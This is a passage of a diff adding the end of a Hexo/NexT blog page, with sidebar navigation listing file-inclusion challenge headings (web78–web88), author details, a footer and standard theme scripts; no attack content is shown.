+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web78"><span class="nav-number">1.1.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web79"><span class="nav-number">1.2.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80"><span class="nav-number">1.3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web81"><span class="nav-number">1.4.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web82"><span class="nav-number">1.5.</span> <span class="nav-text">web82</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web88"><span class="nav-number">1.6.</span> <span class="nav-text">web88</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">作者:ignite</p>
+  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">作者:ignite</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
